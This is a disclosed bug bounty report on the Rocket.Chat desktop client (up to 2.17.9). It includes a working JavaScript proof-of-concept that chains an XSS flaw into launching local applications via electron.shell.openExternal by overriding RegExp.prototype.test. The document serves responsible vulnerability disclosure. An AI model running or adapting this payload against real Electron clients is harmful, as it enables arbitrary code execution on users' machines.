# XSS leads to RCE on the RocketChat desktop client.

## Report Details
- **Report ID**: 899964
- **URL**: https://hackerone.com/reports/899964
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2020-06-16T21:43:42.695Z
- **Disclosed**: 2021-01-01T14:15:11.203Z

## Reporter
- **Username**: fabianfreyer
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: rocket_chat

## Vulnerability Information
**Summary:** It is possible to call `electron.shell.openExternal` from javascript inside a server webview.

**Description:** The document `onclick` handler allows executing `electron.shell.openExternal` by crafting an attacker-controlled link and dispatching a `click` event on it after overwriting `Regex.test`.

## Releases Affected:

  * Rocket.Chat Desktop Client up to version 2.17.9

## Steps To Reproduce (from initial installation to vulnerability):

  1. Have a XSS vulnerability such as #894462 or #899954.
  2. Call the following payload (for macos, adjust for other OSes as required):

```js
(function() {
    const payload = `file:///System/Applications/Calculator.app`;
    var counter = 0;
    var target = document.createElement(`a`);
    target.setAttribute(`href`, payload);
    document.body.appendChild(target);
    var old_test = RegExp.prototype.test;
    RegExp.prototype.test = function (s) {
        if (s === payload) {
            return (++counter > 3);
        }
        return old_test.call(this, s);
    };
    target.dispatchEvent(new Event(`click`));
})();
```

  3. Browse to a page with the XSS payload.
  4. Use your freshly opened calculator to calculate the result of 7*191.

## Impact

An attacker with a XSS vulnerability in RocketChat such as #894462 or #899954 can call `electron.shell.openExternal` with arbitrary URLs, leading to arbitrary command execution.

## Attachments
- rc.png
